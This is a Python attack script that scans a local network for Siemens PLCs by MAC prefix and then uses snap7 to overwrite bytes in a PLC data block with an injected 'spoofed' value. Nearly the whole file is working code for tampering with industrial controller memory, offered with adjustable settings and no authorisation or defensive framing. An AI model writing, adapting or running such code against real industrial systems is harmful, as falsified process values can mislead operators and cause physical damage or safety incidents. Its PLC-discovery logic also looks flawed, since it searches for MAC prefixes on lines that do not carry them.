import snap7
import socket
import struct
import time
import subprocess
import re

# Configuration - ADJUST THESE
# You will need to adjust these based on your specific PLC configuration
PLC_RACK = 0
PLC_SLOT = 1
DATA_BLOCK_NUMBER = 1  #  The DB number containing the data to spoof.  Find the right one!
START_BYTE = 0  # Start byte offset within the Data Block
NUMBER_OF_BYTES = 4 # Number of bytes to modify (e.g., for a float or int)
SPOOFED_VALUE = 123.45 # The value you want to inject.  Make sure it's the right data type!

# Define default PLC IP address (to be overwritten if discovery succeeds)
PLC_IP_ADDRESS = "192.168.1.10"  # Replace with your PLC's IP, or leave it to auto-discover

def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the network.
    Requires nmap to be installed and in the system's PATH.
    """
    try:
        # Get local network prefix (e.g., 192.168.1. for 192.168.1.100)
        # This assumes the default gateway is on the same network
        result = subprocess.run(['ipconfig'], capture_output=True, text=True, check=True)  #Windows way
        ipconfig_output = result.stdout
        match = re.search(r'Default Gateway . . . . . . . . . : (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', ipconfig_output) #Windows way
        if match:
            gateway_ip = match.group(1)
            network_prefix = '.'.join(gateway_ip.split('.')[:3]) + '.'
            print(f"Detected network prefix: {network_prefix}")
        else:
            print("Could not automatically determine network prefix from default gateway.")
            return None


        # Scan the network using nmap (requires nmap to be installed)
        #  Adjust the range (e.g., 1-254) if needed for your network size
        nmap_command = ['nmap', '-sn', network_prefix + '1-254']  # Ping scan for speed
        result = subprocess.run(nmap_command, capture_output=True, text=True, check=True)
        nmap_output = result.stdout

        # Find potential Siemens PLC IP addresses (based on MAC address prefix)
        # Siemens PLCs often have a MAC address starting with 00:08:DC or 00:28:63
        plc_ips = []
        for line in nmap_output.splitlines():
            if "00:08:DC" in line or "00:28:63" in line:
                match = re.search(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
                if match:
                    plc_ips.append(match.group(1))

        if plc_ips:
            print(f"Found potential PLC IP addresses: {plc_ips}")
            return plc_ips[0] # Return the first one found.  You might need to refine this!
        else:
            print("No Siemens PLC IP addresses found on the network.")
            return None

    except FileNotFoundError:
        print("Error: nmap is not installed or not in your system's PATH.  Please install nmap.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"Error running nmap: {e}")
        print(f"nmap output: {e.stderr}") #show error output
        return None
    except Exception as e:
        print(f"An unexpected error occurred during IP discovery: {e}")
        return None



def spoof_reporting_message(plc_ip, rack, slot, db_number, start_byte, number_of_bytes, spoofed_value):
    """
    Spoofs a reporting message in the PLC by writing a value to a Data Block.

    Args:
        plc_ip (str): The IP address of the PLC.
        rack (int): The PLC rack number.
        slot (int): The PLC slot number.
        db_number (int): The Data Block number to modify.
        start_byte (int): The starting byte offset within the Data Block.
        number_of_bytes (int): The number of bytes to write.
        spoofed_value (float): The value to write.  Assumes float for simplicity. Adapt as needed.
    """
    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, rack, slot)
        print(f"Connected to PLC at {plc_ip}")

        # Read the existing DB to avoid overwriting other data.  Critical!
        db = plc.db_read(db_number, 0, 1024)  #Adjust size (1024) if your DB is larger!
        # print(f"Original DB values: {db}")  #This can be VERY noisy, but useful for debugging

        # Convert the spoofed value to bytes
        #  This example assumes a float.  Adjust for other data types!
        data_to_write = struct.pack(">f", spoofed_value) # >f is big-endian float

        # Check if the data_to_write is of the expected length
        if len(data_to_write) != number_of_bytes:
            raise ValueError(f"The length of data_to_write ({len(data_to_write)}) does not match expected number_of_bytes ({number_of_bytes})")

        # Overwrite the relevant bytes in the DB
        for i in range(number_of_bytes):
            db[start_byte + i] = data_to_write[i]

        # Write the modified DB back to the PLC
        plc.db_write(db_number, 0, db)  # Write the entire DB back!
        print(f"Spoofed value {spoofed_value} written to DB{db_number}, byte {start_byte}")

    except snap7.exceptions.Snap7Exception as e:
        print(f"Snap7 Error: {e}")
        print("Possible causes: PLC not reachable, incorrect Rack/Slot, Protection Enabled on PLC")
    except ValueError as e:
        print(f"Value Error: {e}") #Incorrect length of data to write.
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 'plc' in locals() and plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")


if __name__ == "__main__":
    # Attempt to discover the PLC IP address
    discovered_ip = discover_plc_ip()

    if discovered_ip:
        PLC_IP_ADDRESS = discovered_ip
        print(f"Using discovered PLC IP address: {PLC_IP_ADDRESS}")
    else:
        print(f"Using configured PLC IP address: {PLC_IP_ADDRESS} (Discovery failed)")
        print("Ensure the PLC IP address is correct and reachable if the script fails.")

    # Example usage:  After discovery or if you know the IP
    spoof_reporting_message(PLC_IP_ADDRESS, PLC_RACK, PLC_SLOT, DATA_BLOCK_NUMBER, START_BYTE, NUMBER_OF_BYTES, SPOOFED_VALUE)